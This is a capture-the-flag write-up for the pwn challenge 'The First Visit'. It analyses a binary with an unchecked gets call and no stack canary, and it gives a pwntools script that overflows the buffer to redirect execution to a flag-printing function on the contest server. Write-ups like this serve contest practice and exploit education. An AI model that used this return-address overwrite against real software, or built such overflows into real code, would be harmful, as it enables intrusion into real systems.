https://ctftime.org/event/2638

# The First Visit (PWN)

A quiet café, a simple question. The barista waits, but your order may mean more than it seems.

nc chals1.apoorvctf.xyz 3001

## Analysis

`main` @ `0x08048642`:

- Calls `order_coffee`

`order_coffee` @ `0x080485e6`:

- Calls `gets` with a buffer offset from the return address by 0x2c bytes
- Note: there is no stack canary

`brew_coffee` @ `0x0804856b`:

- Prints the flag

## Solution

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./first_visit", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals1.apoorvctf.xyz", 3001)

payload = b"A" * 0x2c
payload += p32(elf.symbols["brew_coffee"])

p.sendline(payload)

p.readuntil(b"blend.'\n")

flag = p.readline().decode()[:-1]
print(flag) # apoorvctf{c0ffee_buff3r_sp1ll}
```

## Flag
`apoorvctf{c0ffee_buff3r_sp1ll}`

smiley 2025/03/01
